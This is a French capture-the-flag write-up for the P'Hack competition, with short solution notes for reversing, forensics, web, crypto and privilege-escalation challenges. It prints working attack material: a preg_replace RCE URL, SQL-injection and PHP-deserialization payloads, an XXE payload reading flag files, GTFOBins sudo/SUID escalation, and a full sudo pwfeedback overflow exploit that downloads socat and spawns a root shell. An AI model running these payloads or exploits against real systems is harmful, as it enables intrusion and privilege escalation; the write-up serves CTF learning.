# Notes pour le P'Hack

###### tags: `HackX` `CTF` `P'Hack`


## Military grade password 

On passe le fichier *login* via son désassembleur préféré et on obtient un système d'équations à 19 inconnus et 21 équations :

```

int sub_1530(char *a)
{
  if ( a[14] * a[6] * (a[13] ^ (a[12] - a[10])) == 16335 )
  {
    if ( ((char)(a[18] ^ a[1]) ^ (a[15] - a[7])) == 83 )
    {
      if ( (a[17] - a[16]) * (a[0] ^ (a[9] + a[5])) == -5902 )
      {
        if ( a[3] - a[11] == 11 )
        {
          if ( (a[8] ^ (a[4] + a[2])) == 3
            && a[8] + a[15] - a[4] == 176
            && (a[6] ^ ((char)(a[10] ^ a[9]) - a[18] - a[11])) == -199
            && a[2] * a[16] + a[1] * (char)(*a ^ a[17]) == 9985
            && a[13] * a[14] - a[7] == 2083
            && a[12] + a[3] - a[5] == 110
            && a[13] + a[9] + a[10] * a[8] == 5630
            && a[5] - a[16] - a[0] - a[2] == -182
            && a[17] * (char)(a[14] ^ a[7]) == 7200
            && a[1] * a[3] + a[11] * a[6] == 17872
            && a[12] - a[15] - a[4] * a[18] == -5408
            && a[3] * a[15] + a[2] * a[11] == 18888
            && a[16] * (a[5] + a[13]) == 15049
            && a[17] * (a[10] + a[0]) == 12150
            && (char)(a[14] ^ a[6]) * a[18] == 10080
            && a[7] + a[12] - a[4] == 132 )
          {
            return a[9] * a[1] + a[8] == 2453;
          }
        }
      }
    }
  }
  return 0;
}
```
On passe ces équations vers le solver de Z3 (Z3 is an open-source theorem prover by Microsoft)
```
from z3 import *

v0, v1, v2, v3, v4, v5, v6, v7, v8, v9, v10, v11, v12, v13, v14, v15, v16, v17, v18 = BitVecs("v0, v1, v2, v3, v4, v5, v6, v7, v8, v9, v10, v11, v12, v13, v14, v15, v16, v17, v18", 32)


s = Solver()


s.add(v11 ==  v3 - 11)
s.add(v8^(v2+v4)==3)
s.add(v8 + v1 * v9 == 2453)
s.add(v6 * v11 + v3 * v1 == 17872) 
s.add((v7 + v12) - v4 == 132)
s.add((v12 + v3) - v5 == 110)
s.add(v8 * v10 + v13 + v9 == 5630)
s.add(v14 * v13 - v7 == 2083)
s.add(((v12 - v10) ^ v13) * v6 * v14 == 16335)
s.add(v15 - v4 + v8 == 176)
s.add(v11 * v2+ v15 * v3 == 18888)
s.add((v5 - v16) - v0 - v2 == -182)    
s.add((v13 + v5) * v16 == 15049)
s.add((v0 + v10) * v17 == 12150)
s.add(((v5 + v9) ^ v0) * (v17 - v16) == -5902)
s.add(((v15 - v7) ^ v1 ^ v18 == 83) )
s.add((v17 ^ v0) * v1 + v16 * v2 == 9985)
s.add((v7 ^ v14) * v17 == 7200)
s.add(v18 * (v6 ^ v14) == 10080)
s.add(((v9 ^ v10) - v18 - v11) ^ v6 == -199)
s.add(v12 - v15 - v18 * v4 == -5408)


print(s.check())
print(s.model())
```

On obtient les caractères en décimal de l'identifiant:

113 52 69 111 45 101 121 77 113 45 49 100 100 48 45 108 101 75 120

**PHACK{q4Eo-eyMq-1dd0-leKx}**


## Android Cloud
On a acces à un écran de déverouillage de type pattern lock d'android. On voit sur la page qu'on a un backup fait à une date donnée qu'on peut le télécharger grâce à l'indication du code php gracieusement donné. Une fois le backup obtenu, on peut récupérer la lock sequence hashée en SHA1 dans le fichier gesture.key dans le dossier /data/system. On brute force et on trouve la séquence qui permet de dévérouiller le lock et d'obtenir le flag. 
## Git de France
On a un git, et le flag est caché dans un des commits.
Heureusement, une commande permet de chercher un texte dans tous les commits : 
```
$ git grep "HACK" $(git rev-list --all)
PHACK{Z2l0IGNvbW1pdCAtbSAiRXogZ2l0IDp0YWRhOiI=}
```

**PHACK{Z2l0IGNvbW1pdCAtbSAiRXogZ2l0IDp0YWRhOiI=}**

## RAID Dead Redemption 

Pour ce challenge, on a 3 fichiers DISK1.bin, DISK2.bin, DISK3.bin où DISK2.bin est vide; en se renseignant
sur ce qu'est RAID et comment ça marche, on apprend qu'il est possible de restaurer DISK2.bin par la formule : DISK2 = DISK1 xor DISK3

Ensuite reste à combiner ces fichiers pour obtenir un disque complet. Le document Notice_Mastok_3000.pdf nous renseigne sur l'agencement, alors par un petit script : 
```
n = 648*1024
k = 1 

with open("DISK1.bin", "rb") as f1:
    with open("DISK2.bin", "rb") as f2:
        with open("DISK3.bin", "rb") as f3:
           with open("DISK", "wb") as f_out:
               x = 2
               off = 0
               for _ in range(n):
                   blocks = (f1.read(k), f2.read(k), f3.read(k))
                   data_blocks = []
                   for e in range(3):
                    if(e%3 != x):
                        data_blocks.append(blocks[e])
                   off= (off + 2)%3
                   x = (x - 1) % 3
                   f_out.write( b"".join(data_blocks) )
```
On obtient alors DISK qui n'est autre qu'un png. Je le passe par aperisolve et obtient (BINWALK) plusieurs jpg et png. Dans l'un d'eux on peut voir le flag





## Piraterie EP1
Dans un premier temps : 
*volatility imageinfo -f dump.raw*

On apprend que le dump vient d'un Windows 7. Ensuite, on vérifie l'état de la console, où on trouve le flag écrit en clair.

*volatility consoles --profile=Win7SP1x86 -f dump.raw*

**PHACK{STEP_1-IC4nD0Wh4TuD0}**
## Piraterie EP2

Dans EP1 on remarque Wallpaper.jpg : 
*volatility  --profile=Win7SP1x86 -f dump.raw filescan | grep "jpg"*

On obtient que le fond d'écran est en 0x000000007d10b440, donc : 
*volatility  --profile=Win7SP1x86 -f dump.raw dumpfiles -Q 0x000000007d10b440 -D dmp/*

On obtient une image avec le flag

## Piraterie EP3
*volatility netscan --profile=Win7SP1x86 -f dump.raw*

On remarque que powershell communique avec 185.13.37.99:1337 : 

On convertit ip:port en base64:

**PHACK{MTg1LjEzLjM3Ljk5OjEzMzc=}**

## Hello World
On arrive sur un site web, qui nous indique où regarder.
**PHACK{W3lc0me_To_7h3_H4ch1ng_WooorlD!!}**

## Wall-E
/robots.txt -> /8059dd56-3bfb-11eb-adc1-0242ac120002/nothing-here.txt
**PHACK{r0b07s_4r3_tH3_n3w_hUm4Ns}**

## Fuzz me

DirBuster donne:

/api/sessions
```
{"sessions":["eyJ1c2VyIjogIjY1YTlmYzRjLWIwNDYtNDE3OS1iMDE5LTdlMDcxZDFjZTc5ZiIsICJpc0FkbWluIiA6IGZhbHNlLCAid2VpcmRfc3R1ZmYiIDogIitBSEc5NUZKeHRzNGoxNFJuTHdxaEE9PSIsICJoYXBweV9zbWlsZXkiIDogIvCfmI0ifQ==","eyJ1c2VyIjogIjkwNjhjY2ZmLTBkOTgtNGViNS1iMjdkLTQyZDcwZTQyYmRkZCIsICJpc0FkbWluIiA6IGZhbHNlLCAid2VpcmRfc3R1ZmYiIDogIkkvS3M1clg0SGJSb2hhbm9pc1lUOXc9PSIsICJoYXBweV9zbWlsZXkiIDogIvCfpoQifQ==","eyJ1c2VyIjogImIwZWU5YjNjLTdkNjMtNDQwZi05ZDcyLWM3NTg2ODZiMDVlNCIsICJpc0FkbWluIiA6IGZhbHNlLCAid2VpcmRfc3R1ZmYiIDogIjYwY3k4bUJrM3luOFNhRisvSGVhUHc9PSIsICJoYXBweV9zbWlsZXkiIDogIvCfkp0ifQ==","eyJ1c2VyIjogIjEzYTE0NTExLTc3NzktNDJmNS04MjliLTc1OTc3MzRjODc0YyIsICJpc0FkbWluIiA6IGZhbHNlLCAid2VpcmRfc3R1ZmYiIDogIjRVQWljczZ3TzkvVzM3Qjd2Q0NQT3c9PSIsICJoYXBweV9zbWlsZXkiIDogIvCfmYsifQ==","eyJ1c2VyIjogIjg3MmUwYTQxLTk5ZTUtNGU3Ni1hNWU3LTk2MDkzNzU3ZmE4MSIsICJpc0FkbWluIiA6IHRydWUsICJ3ZWlyZF9zdHVmZiIgOiAiU1NCaGJTQjBhR1VnWVdSdGFXNGdJUT09IiwgImhhcHB5X3NtaWxleSIgOiAi8J+RqOKAjfCfjbMifQ==","eyJ1c2VyIjogIjk2OGYyZTlkLTI3YzEtNDUwMy05NzM5LTNiMWM4NjMwNjU2NCIsICJpc0FkbWluIiA6IGZhbHNlLCAid2VpcmRfc3R1ZmYiIDogIllOK1pWNWxTMkZTNjlaMmhmd1RaT3c9PSIsICJoYXBweV9zbWlsZXkiIDogIvCfjIgifQ==","eyJ1c2VyIjogIjViNTgwMDcyLTM2YzAtNDU0Yi04NThiLTVmZmJjOTRiNjgyNSIsICJpc0FkbWluIiA6IGZhbHNlLCAid2VpcmRfc3R1ZmYiIDogIkZkNWlPVU9qMDJrZmU0aDMyOGplNHc9PSIsICJoYXBweV9zbWlsZXkiIDogIvCfkoMifQ=="]}
```

Une des sessions est admin:
```
{"user": "872e0a41-99e5-4e76-a5e7-96093757fa81", "isAdmin" : true, "weird_stuff" : "SSBhbSB0aGUgYWRtaW4gIQ==", "happy_smiley" : "👨‍🍳"}
```

ça me fait penser au chall Wall-e, on va dirbuster 872e0a41-99e5-4e76-a5e7-96093757fa81/ -> ça donne rien

Dans le source, pour le user c'est indiqué que *Valid email is required: ex@abc.xyz*, donc j'essaye de fuzz au niveau du nom, du mail provider et du mdp, mais pour l'instant rien 
--> un admin m'a confirmé que ce n'était pas ça qu'il fallait fuzzer.

trouver le endpoint /api/user:
```
$ python3 dirsearch.py -u http://fuzz-me.phack.fr/api/ -e sh,txt,php,html,htm,asp,aspx,js,xml,log,json,jpg,jpeg,png,gif,doc,pdf,mpg,mp3,zip,tar.gz,tar -w ../directory-list-lowercase-2.3-big.txt --plain-text-report=dirsearch_fuzzme_quick
```

trouver le paramètre uuid:
```
$ wfuzz -c -w directory-list-lowercase-2.3-big.txt --hs "manquant !" "http
://fuzz-me.phack.fr/api/user?FUZZ=test"
```

L'url: http://fuzz-me.phack.fr/api/user?uuid=872e0a41-99e5-4e76-a5e7-96093757fa81 -> donne les infos de l'admin

**PHACK{th1s_1s_H0w_w3_d0_enum3r4ti0n_m4n}**

## X-tension
On nous demande de télécharger une extension Chrome.
Avec une autre extension: https://chrome.google.com/webstore/detail/chrome-extension-source-v/jifpbeccnghkjeaalbbjmodiffmgedin/related
On peut lire le code source, et le flag est en clair dans content.js

**PHACK{CRX_F1l3_R3v3rs1nG}**

## Harduino

Simulateur d'affichage LCD Arduino, avec un code PHP pour donner le texte à afficher.

On peut passer le message à afficher : http://harduino.phack.fr/workspace/apps/arduino/arduino.php?message=test

il faut utiliser le preg_replace pour lire le flag.
RCE : 
*http://harduino.phack.fr/workspace/apps/arduino/arduino.php?message=%22.system(%27cat /flag.txt%27).%22*

**PHACK{W4SNT_DAT_HARD_AFT3R_ALL}**

## VOD
Injection SQL:
xwjtp3mj427zdp4tljiiivg2l5ijfvmt5lcsfaygtpp6cw254kykvpyd.onion:1337/platform.php?id=' OR '1'='1

' OR 1=2 UNION SELECT 1,2,group_concat(flag) FROM s3cr3t WHERE '1

**J'ai oublié de noter le flag**

## PHackTory
Confirmation par me créateur du chall qu'il faut DirBuster.
Hint : il faut trouver la bonne extension

-> zip
backup.zip

```
$ curl -v --data "is=1539&cool=test" "http://phacktory.phack.fr/?what=is&the=flag&please=O%3A9%3A%22PHackTory%22%3A3%3A%7Bs%3A4%3A%22type%22%3Bs%3A28%3A%ho%20shell_exec%28%27ls%20-la%27%29%3B%2F%2F%22%3Bs%3A8%3A%22quantity%22%3Bi%3A1%3Bs%3A5%3A%22order%22%3Bs%3A5%3A%22milky%22%3B%7D"
...
drwxrwxrwx 1 www-data www-data   4096 Apr  1 23:03 .
drwxr-xr-x 1 root     root       4096 Mar 31 09:51 ..
-rw-r--r-- 1 root     root     190706 Apr  1 22:56 backup.zip
-rw-r--r-- 1 root     root        771 Apr  1 22:56 config-126546845171616835186.php
drwxr-xr-x 2 root     root       4096 Apr  1 23:03 images
-rw-r--r-- 1 root     root       3346 Apr  1 22:56 index.php
```

**PHACK{l3s_cl0Ch3s_s0nT_p4s5ees_!}**

## Agenda
On a un endpoint GraphQL.
agenda-backend.phack.fr/graphql

Requête pour tout extraire :
{"query":"{__schema{queryType{name}...

Il y un objet Person avec login et mot de passe.

Requête :
{"query":"query {persons {id, login, passw0rd}}"}

Compte: flagman/s3cr3t_d0_n07_Sh4r3

**PHACK{1_l0v3_gR4pHQl_1ntR0sp3ct10n}**

## Agenda 2
Back: agenda2-backend.phack.fr/graphql
Même idée, mais les passwords ne sont pas retournées.
Par contre, il y a une fonction pour rajouter un compte.

{"query":"mutation { addPerson(person: {name:\"maxime\",blog:\"balek\",githubAccount:\"balek\",login:\"maxou\",passw0rd:\"aaaa\"})  {name,blog,githubAccount,login,passw0rd}}"}

**J'ai oublié de noter le flag**
## The Faceboox

Un compte de démo est mise à disposition de la presse: demo/demo.
Ca set un cookie en base64 qui contient *{"id":1,"type":"press"}*. et on est redirigé vers press.php.

Si on change le type, on obtient le message 
`ERROR: Account type "student" are not allowed here. Please refer to whitelist : [profile.php, ..]`

Youhou !!!! On a accès à un compte !

http://the-faceboox.phack.fr/user.php?id=5 -> profile de Mark -> mark.zuckerberg@thefaceboox.com

Erreur SQL sur la recherche:
http://the-faceboox.phack.fr/backend/search.php?name=1
-> conduit à http://the-faceboox.phack.fr/old_Test_Database.sql

-> La fox a le même id que Mark, il suffit de brute force leur mdp et on aura le compte de Mark. (pas bonne direction)

Rachel (id=4) travaille à la Fox, et dans le dump de la bdd on a le hash de son mdp avec le post-fix salt *7heF@c3b00x*.
Peut-être que c'est le même mdp que pour le compte presse.
->
`$ hashcat --force -m 10 -a 0 to_crack.txt rockyou.txt`
-> fox12345
C'est pas le mdp du compte fox, mais en allant fouiller les messages privé du compte de Rachel :
```
From : Mark Zuckerberg
 
Hey Rachel ! I've juste reset the Fox News press account password as you requested.

The new password is : jKslA54sSjdAjs.

Make sure to change it next time you login ! :)
```

C'est fini, on se connecte au compte press et on a accès au compte de Mark.

**PHACK{1Nt3rnet_C'e7ait_m1euX_Av@nt!:(}**

## Agent Secrétariat
Setup un petit fishing LinkedIn et on attend que Jessica vienne.

**PHACK{U_gOt_mY_P4sswOrD_wi7h_s0ci4l_3ngin33ring}**

## Ben & Harry

On nous envoie un message avec une base puis des nombres dans cette base, il faut renvoyer rapidement ces nombres en base 10.

## Quick Response Code

On doit décoder ~ 2000 QR codes, il faut automatiser le processus avec deux librairies python (une seule ne décode pas tous les codes QR)

## A-Maze-ing
http://a-maze-ing.phack.fr:4242/

longeur d'une chaine pour un labyrinthe: 441 = 3^2 * 7^2 -> largeur de 3*7

Exemple :
```
#####################
#x#   #   #         #
# # # # ### ##### # #
#   # #     #     # #
##### # ##### #######
#     # #   #       #
# ##### ### ####### #
#   # #   #       # #
### # ### # ####### #
#   #     # #     # #
# ### ##### # ### # #
#   #   #   # #   # #
### ### # ### # ### #
# # #     #   # #   #
# # ####### ### ### #
#   #       # # #   #
# ### ####### # # ###
#   #   #     # #   #
### ### # ##### ### #
#       #          $#
#####################
```

Petit code python.
**PHACK{M4zEs_4Re_7rUly_4m@zIng}**

## WikiBot
J'ai lancé pas mal de fois le test, jusqu'à obtenir toutes les questions.
J'ai codé un vieux trucs en JS qui lance une fonction toutes les secondes, récupère la question posée par le BOT et place dans le clipboard la réponse que je colle rapidement dans discord.

**PHACK{i_4m_th3_w1k1_b0t}**

## Strong Daddy
Texte traduit en alphabet phonétique de l'OTAN plusieurs fois. Le traduire (en plusieurs passes) permet d'obtenir le flag.

## Caumunikassion
## Chasse aux oeufs
Les 14 oeufs ne sont pas durs à trouver, mais qu'en faire. Binwalk ne donne rien, Aperisolve non plus.

Chaque oeuf a une couleur de fond codée sur 3 octets qui correspondent chacun à une lettre en ASCII:

**PHACK{\_Eggc3ll3nt_ch4ll3ng3_1si'm_it_?!?_}**
## Alter Egg-o
Il s'agit d'un png dont le magic number a été modifié par *deadbeef*, il suffit de rétablir le 89 50 4E 47 et on obtient une image où on peut lirele flag.

## Cracky
## Etsy
On a un hash du mot de passe de différents utilisateurs, celui qui nous intéresse est Phackito. On nous a fourni une liste à utiliser pour cracker le mot de passe. On fait tourner john avec cette wordlist et on obtient le password.
**PHACK{murder}**
## Sammy
Pour le challenge on a des fichiers system et sam. Une fois passé par samdump2, on obtient les hash (User: id:LM:NTLM:::): 
*disabled* Administrateur:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
*disabled* Invité:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Elon:1001:aad3b435b51404eeaad3b435b51404ee:353875adf7d98a07cb73399478978de1:::

le hash aad3b435b51404eeaad3b435b51404ee correspond a la chaine vide et veut dire que LM n'est pas utilisé

j'ai passé les hashs d'Elon sous john avec rockyou mais rien trouvé (on pouvait s'en douter vu la description du challenge...)

En passant par https://hashes.com/en/decrypt/hash, on obtient directement le mdp --'

**PHACK{Tesla1971}**

## Guacamole
## Enchaîné
## H3lp
C'est du L33t Sp34k hardcore
En fait c'était du LSPK90H, une variante du leet speak où les caractères subissent une rotation de 90 de degrés.

**PHACK{PIZZAPLANET}**
## Certifié Sécurisé
A partir du pcapng, on peut tirer des certificats. J'ai essayé de casser la clé publique mais sans succès.


## Une Douce Petite Musique

On a un fichier midi et un tableau excel.
On convertit chaque note en notation Américaine (C1, D1 ...)
ça donne une ligne/colonne dans le tableau et constitue le flag.

**PHACK{\_ALLUMER_LE_FEU_ALLUMER_LE_FEU_ET_FAIRE_DANSER_LES_DIABLES_ET_LES_DIEUX_ALLUMER_LE_FEU_ALLUMER_LE_FEU_ET_VOIR_GRANDIR_LA_FLAMME_DANS_VOS_YEUX_ALLUMER_LE_FEU_}**

## Sauce.io

Grâce à un tweet random : réseaux-sauce.io (réseaux sociaux)
Sachant que le chall est classé "réseaux" (et que les vrais challenges de réseaux ont le tags "network")

Sur le compte Twitter de P'Hack, en regardant l'image de la bannière, elle s'étend et le flag y est écrit ...

**PHACK{Lupin_i5_mY_K1nG_Follow_Us}**

## Mr. Weak
Trouver le github de johnny weak, lire le bash history puis connection ssh => flag

## X-sière ##

Essais: (ça devient chiant...)
- NAVIGATOROFTHESEAS
- LADYLARA
- MSCGRANDIOSA
- REGALPRINCESS
- MSCMAGNIFICA
- QUEENVICTORIA
- MSCFANTASIA
- CELIBRITYECLIPSE
- COSTARIVIERA
- CELEBRITYSILHOUETTE
- CELESTYALEXPERIENCE
- SILVERSPIRIT
- SEVENSEASMARINER
- CELEBRITYREFLECTION
- WINDSTAR
- WINDPRIDE
- MSCMUSICA
- BLUESTARFERRIES
- LOUISCRUISES
- LOUISMAJESTY
- OCEANIARIVIERA
- P&OOCEANA
- NORWEGIANSPIRIT
- Aucun des AIDA
- MARELLACELEBRATION
- CELESTYALCRYSTAL

**PHACK{CELEBRITYINFINITY}**

## Sudoku
```
-bash-5.1$ sudo -l
User padawan may run the following commands on sudoku:
    (master) NOPASSWD: /usr/bin/zip
```
Ca alors ! Go to GTFBin

```
TF=$(mktemp -u)
sudo -u master zip $TF /etc/hosts -T -TT 'sh #'
```

**PHACK{U_h4v3_tH3_suP3r_P0w3r}**

## To B, or ! to B
On cherche les executables qui ont le SUID bit.
```
-bash-5.1$ find / -user master -perm -4000 -exec ls -la {} \;
-rwsr-xr-x    1 master   root         14048 Mar 15 12:52 /usr/bin/python3.8
```
```
-bash-5.1$ python3.8
>>> open("/home/master/flag.txt","r").read()
```

**PHACK{U_4r3_hiM_bu7_h3's_n07_U}**

## Sudoku v2
L'options pwdfeedback est bugué, et permet de réaliser un buffer overflow. On trouve le bon petit exploit sur internet.

https://www.exploit-db.com/exploits/47995

```
#!/bin/bash

if [ ! -f socat ];
then
    wget https://raw.githubusercontent.com/andrew-d/static-binaries/master/binaries/linux/x86_64/socat
    chmod +x socat
fi

cat <<EOF > xpl.pl
\$buf_sz = 256;
\$askpass_sz = 32;
\$signo_sz = 4*65;
\$tgetpass_flag = "\x04\x00\x00\x00" . ("\x00"x24);
print("\x00\x15"x(\$buf_sz+\$askpass_sz) .
     ("\x00\x15"x\$signo_sz) .
     (\$tgetpass_flag) . "\x37\x98\x01\x00\x35\x98\x01\x00\x35\x98\x01\x00\xff\xff\xff\xff\x35\x98\x01\x00\x00\x00\x00\x00".
     "\x00\x00\x00\x00\x00\x15"x104 . "\n");
EOF

cat <<EOF > exec.c
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

int main(void)
{
        printf("Exploiting!\n");
        int fd = open("/proc/self/exe", O_RDONLY);
        struct stat st;
        fstat(fd, &st);
        if (st.st_uid != 0)
        {
                fchown(fd, 0, st.st_gid);
                fchmod(fd, S_ISUID|S_IRUSR|S_IWUSR|S_IXUSR|S_IXGRP);
        }
        else
        {
                setuid(0);
                execve("/bin/bash",NULL,NULL);
        }
return 0;
}
EOF
cc -w exec.c -o /tmp/pipe
./socat pty,link=/tmp/pty2,waitslave exec:"perl xpl.pl"&
sleep 0.5
export SUDO_ASKPASS=/tmp/pipe
sudo -k -S id < /tmp/pty2
/tmp/pipe
```

**PHACK{\*\_\*\*\*\*\_\*\*\*\*\_\*\*\*\*\_\*\*\*\_\*\*\_\*\_\*\*\*\*\_\*\*\*}**

## Graduated
Une tâche cron tourne et exécute un script python auquel on a pas accès. Cependant on devine qu'il va lire les fichiers XML qu'on place dans /home/teache/done pour intégrer les données dans une base de données.

Le champ COMMENT n'a pas de vérification (contrairement aux autres) et il est donc possible d'injecter une commande :

```
<?xml version="1.0" encoding="utf-8"?>

<evaluation>
  <student>
    <firstname>Maxime</firstname>
    <lastname>DUPONT DE L</lastname>
  </student>
  <grade>20</grade>
  <subject>Biologie</subject>
  <teacher>
    <firstname>Emile</firstname>
    <lastname>LOUIS</lastname>
  </teacher>
  <comment>' || sqlite_version(), 0, 0) -- </comment>
</evaluation>
```

En fait la vuln n'est pas au niveau de SQLite mais du parser XML...

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE test [
    <!ENTITY xxe SYSTEM "file:///home/rector/flag.txt">
  ]>

<evaluation>
  <student>
    <firstname>Maxime</firstname>
    <lastname>DUPONT DE L</lastname>
  </student>
  <grade>20</grade>
  <subject>Biologie</subject>
  <teacher>
    <firstname>Emile</firstname>
    <lastname>LOUIS</lastname>
  </teacher>
  <comment>&xxe;</comment>
</evaluation>
```

**PHACK{XmL_3x7Ern4l_3n7i7iEs_fr0m_b4sH}**

## WE-3
On brute force le mdp du zip avec une wordlist.
Le fichier "corrompu" décrit une partie d'échec.
Il suffit alors de jouer la partie sur un site et de trouverl les mouvement manquant.

**PHACK{cb51e1b764c10a01c5983e99f3d8d386}**
## WE-2
On code un petit truc en python pour extraire continuellement les archives. Les dernières on des noms qui donnent le flag.

**PHACK{R3ady_4_a_z1pl1n3_r1d3}**
## WE-1
Il nous manque le hash d'une seule équipe.

```
Le notre
38-4b8af6c974828dd6c60ab544e3c273a8b7c1b4ee773076982ef70ddab62944798c43eb62f1cc25d989d26e02ade2132ee3d18d619b20a5126a94b02d0144152a22e9e303ee4ae22e08f59a5663428146a605b26c3ded23f9f1cca6ef07a2f0f6b5
X-Wish
39-29173e293536d2a099af92f90325eb3a899c520c099176affef69e390acd7552e6d3fe15d7715c5a0ed5ca2e2761396784e5a7f37eb5ee432efa99d5b4921aaa7f6cff7375f116d4fde89712b928bd919100ad050f1f8154f047665d4c8c0aad31
Recu en double, par deux équipes différentes
40-e31f57a97d924f8dc38b840d745f1df88a70517075498ba751f6c59a15766e6b98a86235eaef26d213dcdc5b8f6d627e02158c6e4d31187b25af27f933f13bd2c7c7ebbb434b11962089f56646b8a9d7b33eda50033fc4dacbe1170b79277256b6
Un gentil mec de l'équipe me l'a confirmé
24-d542d717d933b3fee5a88837b3c49a62faa4f701204018518c8cede1711f1f1d02462a1baed2e785c8b794fd60b67d346e0a4aa169898a823c9158bbd1a5ca4cc12a28899a0c3eeb0087e69d600f701978dd1951332c3a1201d9457a508ca1d05f

15-d76439aa22a213f152efe19b351b19a78ad4d7eeba72a9a38944269499785a19a629d13655693005de16d9df293477c71c7e8e1e7af006746d4bf753e4b1345023c9aced288c92a00b24e22a901cbc3b4d7567392d8df641b2ed9637444413d359

(Un nouveau)
18-a3fe0dac3ee83db1216e5054a5083ed94892ed89701b6e48f446efe24e2280c6d6515275f55cdd6fe94ac9fde1cba9eb03e4acd35c6d7a8b84cd4a14504aae55f5b8ad64a1cf4b709c74769320e75767b2720761b223b64da460d911e186d7eaf7

```

http://point-at-infinity.org/ssss/demo.html

**PHACK{And the eighth and final rule, if this is your first night at Flag Club, you have to flag!}**

## Journée portes ouvertes
```
sudo nmap -v -A -T4 -p0- journees-portes-ouvertes.phack.fr
```

Plein de ports ouverts, certains sortent un "There is nothing there" et d'autres un bout du flag.

**PHACK{s4cr3_c0ur4nt_d'R}**

## Tenet
On a un échange Telnet, a un moment l'utilisateur demande l'affichage du fichier contenant le flag, et reçoit une chaîne en base64. Et on obient le flag...

**PHACK{d0_n0t_us3_1ns3cUr3_pR0t0c0l}**
## Système de nom de domaine
```
$ dig flag.phack.fr @12.42.0.53 ANY
...
flag.phack.fr.          3599    IN      TXT     "PHACK{diG_i7_4nD_f0uNd_i7_In_y0uR_dNs}"
...
```

**PHACK{diG_i7_4nD_f0uNd_i7_In_y0uR_dNs}**

## Thief
Un dump avec des requêtes DNS vers des domaines bizarres:
7b22696e646578223a202231222c202264617461223a20222b227d.phack.fr

Hex to text : 7b22696e646578223a202231222c202264617461223a20222b227d
-> {"index": "1", "data": "+"}

Bon il faut juste tout récupérer et mettre dans l'ordre...

**PHACK{3xf1ltR4ti0n_thRoUgh_dNs}**

## Ping Pong
Des paquets ICMP avec chacun un octet ...

**PHACK{p1n9_p0n9_p1n9_p0n9_qu1_4_d3j4_j0u3_4u_73nn15_d3_74813_?}**
